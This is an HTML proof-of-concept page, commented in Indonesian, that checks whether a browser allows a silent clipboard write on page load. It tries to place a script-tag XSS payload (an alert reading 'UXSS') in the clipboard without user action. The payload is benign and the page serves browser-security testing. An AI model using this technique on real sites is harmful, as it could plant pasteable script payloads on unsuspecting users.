<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC: Attack Site - Silent Clipboard Write</title>
</head>
<body>
    <h2>Menguji Celah Browser: Silent Clipboard Write</h2>
    <p>Memeriksa apakah browser mengizinkan penulisan clipboard tanpa interaksi pengguna...</p>

    <script>
        // Memicu fungsi secara otomatis saat halaman selesai dimuat
        window.onload = async () => {
            const payload = '<script>alert("UXSS: Sukses mengeksploitasi clipboard!")<\/script>';
            
            try {
                // Mencoba menulis ke clipboard tanpa adanya event klik/keyboard dari user
                await navigator.clipboard.writeText(payload);
                console.log("[DITEMUKAN BUG] Berhasil menulis ke clipboard tanpa interaksi!");
                alert("BUG FOUND: Sukses menulis payload ke clipboard tanpa klik!");
            } catch (err) {
                // Di browser normal, jalurnya akan berakhir di sini (Error: Document is not focused / User activation required)
                console.log("[BLOCKED] Browser aman. Gagal menulis tanpa interaksi: ", err);
            }
        };
    </script>
</body>
</html>
